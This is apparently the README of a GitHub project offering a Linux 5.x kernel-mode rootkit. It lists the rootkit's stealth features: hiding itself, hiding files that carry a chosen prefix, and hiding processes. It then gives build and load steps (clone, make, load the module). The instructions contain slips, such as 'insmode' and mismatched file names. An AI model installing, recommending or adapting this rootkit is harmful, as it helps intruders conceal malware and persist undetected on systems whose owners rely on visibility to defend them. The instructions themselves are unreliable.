# just-r00tkit

just-r00tkit a kernel land rootkit for Linux kernel 5.X that can:

- hide itself

- hide any file or directory starting with justr0ma

- hide any process

# how to use it:

- clone [the repo](https://github.com/justr0ma/justr00tkit.git) justr00tk

- cd to justr00tk && make

- insmode justrootk.o
